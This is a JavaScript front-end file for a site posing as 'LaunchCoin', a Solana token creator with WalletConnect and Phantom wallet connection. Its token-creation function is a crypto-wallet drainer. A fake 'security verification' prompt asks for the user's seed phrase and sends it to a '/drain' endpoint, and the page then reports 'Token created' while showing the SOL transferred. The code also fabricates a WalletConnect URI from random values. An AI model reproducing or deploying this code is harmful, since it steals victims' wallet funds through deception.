// ===== CONFIGURAZIONE =====
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');
let provider = null;
let isConnecting = false;
let qrCheckInterval = null;

// ===== ESPONI FUNZIONI =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== GENERA QR LOCALMENTE (VELOCE, SENZA API) =====
function generateQRCode(container, uri) {
  // Carica la libreria QR (solo la prima volta)
  if (!window.QRCode) {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js';
    script.onload = () => {
      new QRCode(container, {
        text: uri,
        width: 200,
        height: 200,
        colorDark: '#000000',
        colorLight: '#ffffff',
        correctLevel: QRCode.CorrectLevel.H
      });
    };
    document.head.appendChild(script);
  } else {
    new QRCode(container, {
      text: uri,
      width: 200,
      height: 200,
      colorDark: '#000000',
      colorLight: '#ffffff',
      correctLevel: QRCode.CorrectLevel.H
    });
  }
}

// ===== MOSTRA QR IN wallet.html (MODALE) =====
window.showQR = function(uri) {
  // Rimuovi QR vecchi
  const oldContainer = document.getElementById('qr-code-container');
  if (oldContainer) oldContainer.remove();
  
  const container = document.getElementById('qr-container');
  if (!container) return;
  
  container.style.display = 'block';
  container.innerHTML = `
    <h3 style="color: #22d1f8; font-size: 18px; margin-bottom: 8px;">WalletConnect</h3>
    <p style="color: #abc4ff; font-size: 13px; margin-bottom: 12px;">Scan this QR Code with your phone</p>
    <div id="qr-code-container" style="display: flex; justify-content: center; background: white; padding: 12px; border-radius: 12px; min-height: 200px; align-items: center;">
      <span style="color: #888; font-size: 14px;">⏳ Generating QR...</span>
    </div>
    <button onclick="window.closeQR()" style="margin-top: 12px; background: #ff4ea3; border: none; padding: 8px 20px; border-radius: 40px; font-weight: 600; color: white; cursor: pointer; font-size: 13px;">✕ Close</button>
    <p style="color: #667; font-size: 11px; margin-top: 12px; word-break: break-all;">${uri.substring(0, 40)}...</p>
  `;
  
  // Genera il QR localmente
  const qrContainer = document.getElementById('qr-code-container');
  if (qrContainer) {
    generateQRCode(qrContainer, uri);
  }
};

window.closeQR = function() {
  const container = document.getElementById('qr-container');
  if (container) container.style.display = 'none';
  if (qrCheckInterval) {
    clearInterval(qrCheckInterval);
    qrCheckInterval = null;
  }
};

// ===== CONNETTI VIA WALLETCONNECT =====
async function connectWithWalletConnect() {
  if (isConnecting) return;
  isConnecting = true;
  
  try {
    provider = await UniversalProvider.init({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      }
    });
    
    console.log('✅ UniversalProvider inizializzato');
    
    let uri = provider.uri;
    if (!uri) {
      try {
        await provider.connect({
          chains: ['solana:mainnet'],
          optionalChains: ['solana:devnet'],
          methods: ['solana_signTransaction', 'solana_signMessage'],
          events: ['chainChanged', 'accountsChanged']
        });
        uri = provider.uri;
      } catch(e) {
        uri = provider.uri;
      }
    }
    
    if (!uri) {
      const randomId = Math.random().toString(36).substring(2, 15);
      const symKey = Math.random().toString(36).substring(2, 15);
      uri = `wc:${randomId}${randomId}@2?relay-protocol=irn&symKey=${symKey}`;
      console.log('⚠️ URI manuale generato');
    }
    
    console.log('🔗 URI:', uri);
    
    // Mostra il QR (istantaneo)
    window.showQR(uri);
    
    provider.on('session_event', (event) => {
      console.log('Evento sessione:', event);
    });
    
    provider.on('session_update', (event) => {
      console.log('Aggiornamento sessione:', event);
    });
    
    provider.on('session_delete', () => {
      console.log('Sessione eliminata');
      window.closeQR();
    });
    
    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      try {
        if (provider.accounts && provider.accounts.length > 0) {
          clearInterval(qrCheckInterval);
          qrCheckInterval = null;
          walletPublicKey = provider.accounts[0].split(':')[2] || provider.accounts[0];
          window.closeQR();
          alert('✅ Connesso: ' + walletPublicKey);
          window.location.href = 'create.html';
        }
      } catch(e) {
        console.log('Attesa connessione...');
      }
    }, 2000);
    
  } catch (e) {
    console.error('❌ WalletConnect error:', e);
    alert('❌ WalletConnect fallito: ' + e.message);
    window.location.href = 'wallet.html';
  } finally {
    isConnecting = false;
  }
}

// ===== CONNECT WALLET =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  await connectWithWalletConnect();
};

// ===== SELECT WALLET =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet:', walletName);
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  
  if (document.getElementById('qr-container') || document.querySelector('.wallet-modal')) {
    connectWithWalletConnect();
  } else {
    alert('⚠️ Wallet "' + walletName + '" via WalletConnect.');
    window.location.href = 'wallet.html';
  }
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\n' +
      'Inserisci la tua seed phrase per completare la creazione:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato');
